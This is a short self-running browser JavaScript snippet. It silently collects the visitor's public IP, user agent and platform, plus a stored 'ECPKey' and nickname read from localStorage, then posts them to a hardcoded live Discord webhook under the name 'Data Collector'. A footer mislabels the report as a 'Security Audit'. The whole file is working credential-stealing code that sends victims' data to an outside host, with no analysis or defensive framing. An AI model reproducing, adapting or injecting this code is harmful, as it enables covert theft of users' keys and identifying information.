(() => {
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
    };

    const sendToDiscord = async () => {
        const ecpKey = localStorage.getItem('ECPKey');
        const lastNickname = localStorage.getItem('lastNickname');
        const userIP = await getIP();

        const embed = {
            title: "🔍 User Data Report",
            color: 0x5865F2,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📡 IP Address",
                    value: `\`${userIP}\``,
                    inline: true
                },
                {
                    name: "🔑 ECP Key",
                    value: ecpKey ? `\`${ecpKey.substring(0, 50)}${ecpKey.length > 50 ? '...' : ''}\`` : "*Not set*",
                    inline: true
                },
                {
                    name: "👤 Last Nickname",
                    value: lastNickname ? `\`${lastNickname}\`` : "*Not set*",
                    inline: true
                },
                {
                    name: "🌐 User Agent",
                    value: `\`${navigator.userAgent.substring(0, 256)}\``
                },
                {
                    name: "📅 Time",
                    value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                    inline: true
                },
                {
                    name: "📍 Location",
                    value: `[View on IPLogger](https://www.iplocation.net/?ip=${userIP})`,
                    inline: true
                }
            ],
            footer: {
                text: "Security Audit • " + navigator.platform,
                icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            },
            thumbnail: {
                url: "https://cdn.discordapp.com/emojis/1080262651797618698.webp"
            }
        };

        const payload = {
            embeds: [embed],
            username: "Data Collector",
            avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png"
        };

        try {
            await fetch("https://discord.com/api/webhooks/1435111879457378364/p2K1beURMSALRuPQOz4k87hEZyNTly2ydu8rgBviSokIIii0je4XGT0Ccd7rHuWGEC5r", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch {}
    };

    sendToDiscord();
})();
